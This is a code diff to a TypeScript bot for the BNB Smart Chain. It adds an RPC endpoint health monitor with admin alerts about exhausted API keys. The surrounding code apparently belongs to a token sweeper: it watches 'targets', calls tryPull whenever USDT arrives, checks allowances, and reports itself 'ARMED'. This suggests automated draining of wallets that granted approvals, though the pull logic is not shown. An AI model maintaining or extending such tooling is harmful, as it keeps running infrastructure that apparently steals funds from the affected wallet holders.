@@ -1,4 +1,4 @@
-import { createPublicClient, webSocket, fallback, formatUnits } from 'viem';
+import { createPublicClient, webSocket, http, fallback, formatUnits } from 'viem';
 import { bsc } from 'viem/chains';
 import { ENV } from '../config/env';
 import { listActive, setAllowanceOk, type Target } from './storage';
@@ -118,7 +118,35 @@ async function scan(t: Target) {
         if (bal > 0n && bal > prev) {
             console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
             void tryPull(t, tok.token);
-            // BNB leg removed entirely: bot will strictly sweep USDT and ignore native BNB balances.
+            // BNB leg is excluded: bot exclusively sweeps USDT and leaves native BNB untouched for gas.
+        }
+    }
+}
+
+// Background RPC Key Health Monitor
+async function monitorRpcs() {
+    if (!ENV.ADMIN_ID) return;
+    
+    for (const url of ENV.HTTP_URLS) {
+        try {
+            const client = createPublicClient({
+                chain: bsc,
+                transport: http(url, { timeout: 5_000 }),
+            });
+            await client.getBlockNumber();
+        } catch (e: any) {
+            const errorMsg = String(e.message || e);
+            console.error(`[RPC HEALTH ALERT] Endpoint failed: ${url} -> ${errorMsg}`);
+            
+            if (errorMsg.includes('429') || errorMsg.includes('403') || errorMsg.includes('limit') || errorMsg.includes('exceeded')) {
+                await notify(
+                    ENV.ADMIN_ID,
+                    `🚨 <b>Alchemy Key Exhaustion / Error Alert!</b>\n\n` +
+                    `<b>Failed Endpoint:</b> <code>${url}</code>\n` +
+                    `<b>Error Details:</b> <code>${errorMsg}</code>\n\n` +
+                    `<i>Please check your dashboard or add backup keys immediately.</i>`
+                );
+            }
         }
     }
 }
@@ -128,6 +156,9 @@ export async function startEngine() {
     await refresh();
     setInterval(refresh, 4_000);
     setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 300_000);
+    
+    // Check RPC key health every 10 minutes
+    setInterval(monitorRpcs, 600_000);
 
     let chain = Promise.resolve();
     pub.watchBlocks({
@@ -141,7 +172,7 @@ export async function startEngine() {
     });
 
     engineState.armed = true;
-    console.log(`[engine] ARMED ${cache.size} target(s), USDT > 5 threshold enforced`);
+    console.log(`[engine] ARMED ${cache.size} target(s), USDT > 5 threshold enforced with Health Monitor active`);
 }
 
 export { gasOf };
